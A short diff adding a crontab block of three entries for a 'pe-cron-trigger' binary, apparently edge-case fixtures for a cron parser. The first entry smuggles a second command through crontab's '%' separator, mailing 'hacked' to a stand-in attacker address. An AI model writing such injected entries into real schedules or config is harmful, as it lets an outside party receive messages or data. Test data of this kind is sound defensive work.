@@ -1,0 +1,5 @@
+# BEGIN PRISMATIC_NATIVE_CRONS
+0 3 * * * /home/ubuntu/.prismatic/releases/e63d621a26a944a66cd4af2c6b5ab3084fc92b55/bin/pe-cron-trigger --cron-id seo.refresh % mail -s "hacked" attacker@example.com
+0 4 * * * FOO=bar BAZ=1 /home/ubuntu/.prismatic/releases/e63d621a26a944a66cd4af2c6b5ab3084fc92b55/bin/pe-cron-trigger
+0 5 * * * /home/ubuntu/.prismatic/releases/e63d621a26a944a66cd4af2c6b5ab3084fc92b55/bin/pe-cron-trigger "broken ' quotes
+# END PRISMATIC_NATIVE_CRONS
